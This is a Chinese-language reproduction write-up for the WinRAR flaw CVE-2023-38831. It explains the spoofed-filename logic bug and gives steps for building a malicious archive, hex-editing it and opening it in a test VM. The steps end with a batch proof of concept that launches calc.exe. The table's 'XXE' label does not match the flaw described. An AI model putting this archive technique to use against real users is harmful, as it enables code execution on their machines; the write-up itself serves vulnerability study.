# CVE-2023-38831漏洞复现与分析:

## 漏洞简介

| 信息 | 内容 |
| --- | --- |
| 漏洞名称 |  WinRAR XXE → RCE |
| 漏洞编号 | CVE-2023-38831 |
| 风险等级 | 高危 |
| 漏洞类型 | 逻辑缺陷 / 远程代码执行 |
| 利用难度 | 低 |

## 漏洞原理：
- WinRAR 6.23 之前的版本在处理 ZIP 压缩包时存在逻辑缺陷，当用户尝试打开压缩包内的良性文件（如图片或文本文件）时，若压缩包内存在同名恶意脚本文件，WinRAR 会错误调用 ShellExecute 函数执行恶意脚本，导致远程代码执行（RCE）。

## 漏洞复现：
#### 1. 创建恶意文件：
<div align="center">

![alt text](image.png)
![alt text](image-1.png)

</div>

##### 恶意脚本内容
**pure.png3.cmd:**
```bat

@echo off
start calc.exe
echo ==
echo CVE-2023-38831 EXPLOIT SUCCESS!
echo ==
echo Vulnerability Triggered!
pause
```

#### 2.将poc.zip用HxD修改

将png后面的123皆改为空格（ASCII 编码中0x31-0x33对应1,2,3，空格为0x20）
<div align="center">
<div align="center">
  <img src="image-2.png" style="width:50%;"/>
  <img src="image-3.png" style="width:50%;"/>
  <img src="image-4.png" style="width:50%;"/>
</div>
</div>

#### 3.改名为.rar发给安有低版本winrar的win10虚拟机

<div align="center">
  <img src="image-5.png" style="width:70%;"/>
  <img src="image-6.png" style="width:70%;"/>

</div>

#### 4.双击文件pure.png

<div align="center">
  <img src="image-7.png" style="width:80%;"/>
</div>